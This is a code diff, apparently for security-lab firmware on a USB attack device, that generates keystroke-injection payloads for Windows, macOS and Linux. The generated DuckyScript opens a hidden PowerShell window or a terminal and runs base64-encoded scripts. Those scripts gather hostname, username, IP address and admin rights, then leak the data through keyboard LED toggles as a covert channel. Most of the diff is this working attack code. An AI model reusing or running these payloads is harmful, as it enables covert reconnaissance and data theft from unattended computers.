+// ------------------------- Payload generator -------------------------
+static const char *profileTag(BadUsbOsProfile p) {
+    switch (p) {
+        case BADUSB_OS_MACOS: return "macos";
+        case BADUSB_OS_LINUX: return "linux";
+        default: return "windows";
+    }
+}
+
+static String profileLabel(BadUsbOsProfile p) {
+    switch (p) {
+        case BADUSB_OS_MACOS: return "macOS";
+        case BADUSB_OS_LINUX: return "Linux";
+        default: return "Windows";
+    }
+}
+
+static String buildTargetScript(BadUsbOsProfile profile, bool permissionCheck) {
+    String perm;
+    if (profile == BADUSB_OS_WINDOWS) {
+        if (!permissionCheck) perm = "$p='ADMIN=SKIP'";
+        else perm = "$p=\"ADMIN=$([int]([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))\"";
+    } else if (profile == BADUSB_OS_MACOS) {
+        if (!permissionCheck) perm = "PERM=SKIP";
+        else perm = "PERM=$(id -u); groups | grep -q ' admin ' && PERM=1";
+    } else {
+        if (!permissionCheck) perm = "PERM=SKIP";
+        else perm = "PERM=0; [ \"$(id -u)\" = 0 ] && PERM=1; groups 2>/dev/null | grep -Eq '(^| )(sudo|wheel|admin)( |$)' && PERM=1";
+    }
+
+    if (profile == BADUSB_OS_WINDOWS) {
+        String s = R"WIN(
+Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class L { [DllImport("user32.dll")] public static extern void keybd_event(byte v, byte s, uint f, UIntPtr e); }'
+function T([byte]$v){[L]::keybd_event($v,0,0,[UIntPtr]::Zero);[L]::keybd_event($v,0,2,[UIntPtr]::Zero)}
+function Z(){Start-Sleep -Milliseconds 35}
+$h=$env:COMPUTERNAME;$u=$env:USERNAME
+$ip=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -ne '127.0.0.1' -and $_.IPAddress -notlike '169.254*'} | Select-Object -First 1).IPAddress
+if(!$ip){$ip='?'}
+<PERM>
+$d="HOST=$h;USER=$u;IP=$ip;$p"
+$b=[Text.Encoding]::UTF8.GetBytes($d)
+$f=@(0xAA)+@([byte]($b.Length -shr 8),[byte]($b.Length -band 255))+$b
+T 0x91;Z;T 0x91;Start-Sleep -Milliseconds 200
+foreach($x in $f){for($i=7;$i -ge 0;$i--){$bit=($x -shr $i) -band 1;if($bit){T 0x90};Z;T 0x14;Z;if($bit){T 0x90};Start-Sleep -Milliseconds 55}}
+T 0x91;Z;T 0x91;Z;T 0x91
+)WIN";
+        s.replace("<PERM>", perm);
+        return s;
+    }
+
+    if (profile == BADUSB_OS_MACOS) {
+        String s = R"MAC(
+t(){ osascript -e "tell application \"System Events\" to key code $1" >/dev/null 2>&1; }
+h=$(hostname);u=$(id -un);ip=$(ipconfig getifaddr en0 2>/dev/null || ipconfig getifaddr en1 2>/dev/null);[ -z "$ip" ]&&ip='?'
+<PERM>
+d="HOST=$h;USER=$u;IP=$ip;PERM=$PERM"
+n=$(printf '%s' "$d"|wc -c|tr -d ' ');bytes=$(printf '%s' "$d"|od -An -v -tu1|tr ' ' '\n'|sed '/^$/d');f="170 $((n>>8)) $((n&255)) $bytes"
+t 107;sleep 0.1;t 107;sleep 0.2
+for x in $f;do for i in 7 6 5 4 3 2 1 0;do bit=$(( (x>>i)&1 ));[ $bit -eq 1 ]&&t 71;sleep 0.03;t 57;sleep 0.03;[ $bit -eq 1 ]&&t 71;sleep 0.05;done;done
+t 107;sleep 0.1;t 107;sleep 0.1;t 107
+)MAC";
+        s.replace("<PERM>", perm);
+        return s;
+    }
+
+    String s = R"LIN(
+if ! command -v xdotool >/dev/null 2>&1; then exit 1; fi
+t(){ xdotool key --clearmodifiers "$1" >/dev/null 2>&1; }
+h=$(hostname);u=$(id -un);ip=$(hostname -I 2>/dev/null|awk '{print $1}');[ -z "$ip" ]&&ip=$(ip -4 -o addr show scope global 2>/dev/null|awk '{split($4,a,"/");print a[1];exit}');[ -z "$ip" ]&&ip='?'
+<PERM>
+d="HOST=$h;USER=$u;IP=$ip;PERM=$PERM"
+n=$(printf '%s' "$d"|wc -c|tr -d ' ');bytes=$(printf '%s' "$d"|od -An -v -tu1|tr ' ' '\n'|sed '/^$/d');f="170 $((n>>8)) $((n&255)) $bytes"
+t Scroll_Lock;sleep 0.1;t Scroll_Lock;sleep 0.2
+for x in $f;do for i in 7 6 5 4 3 2 1 0;do bit=$(( (x>>i)&1 ));[ $bit -eq 1 ]&&t Num_Lock;sleep 0.03;t Caps_Lock;sleep 0.03;[ $bit -eq 1 ]&&t Num_Lock;sleep 0.05;done;done
+t Scroll_Lock;sleep 0.1;t Scroll_Lock;sleep 0.1;t Scroll_Lock
+)LIN";
+    s.replace("<PERM>", perm);
+    return s;
+}
+
+static String buildDuckyScript(BadUsbOsProfile profile, const String &script) {
+    String b64 = (profile == BADUSB_OS_WINDOWS)
+                     ? base64EncodeUtf16Le(script)
+                     : base64Encode((const uint8_t *)script.c_str(), script.length());
+    String ds;
+    ds += "REM Bruce SecLab+ LED Link | profile=" + profileLabel(profile) + "\n";
+    ds += "REM DATA: hostname, user, internal IPv4, admin/permission check\n";
+    ds += "REM No USB storage, no network; receiver is HID LED Output Reports\n";
+    ds += "REM WAIT_CAPSLOCK 5000 / WAIT_NUMLOCK 5000 are supported by Bruce DuckyScript\n";
+    ds += "DELAY 300\n";
+    if (profile == BADUSB_OS_WINDOWS) {
+        ds += "GUI r\nDELAY 400\nSTRINGLN powershell -NoProfile -NonInteractive -WindowStyle Hidden -enc " + b64 + "\n";
+    } else if (profile == BADUSB_OS_MACOS) {
+        ds += "GUI SPACE\nDELAY 600\nSTRINGLN Terminal\nENTER\nDELAY 1200\n";
+        ds += "STRINGLN echo " + b64 + "|base64 -D|bash\n";
+    } else {
+        ds += "CTRL-ALT t\nDELAY 900\nSTRINGLN echo " + b64 + "|base64 -d|bash\n";
+    }
+    ds += "DELAY 200\n";
+    return ds;
+}
+
+static bool writeWaitDemo() {
+    seclabEnsureDir(kDir);
+    String d = "REM Bruce Smart BadUSB DuckyScript synchronization demo\n";
+    d += "REM Host toggles CAPS LOCK to release this script.\n";
+    d += "WAIT_CAPSLOCK 10000\n";
+    d += "STRINGLN Caps lock sync received\n";
+    d += "REM Host toggles NUM LOCK to release the next stage.\n";
+    d += "WAIT_NUMLOCK 10000\n";
+    d += "STRINGLN Num lock sync received\n";
+    File f = LittleFS.open(kWaitDemoPath, FILE_WRITE);
+    if (!f) return false;
+    f.print(d);
+    f.close();
+    return true;
+}
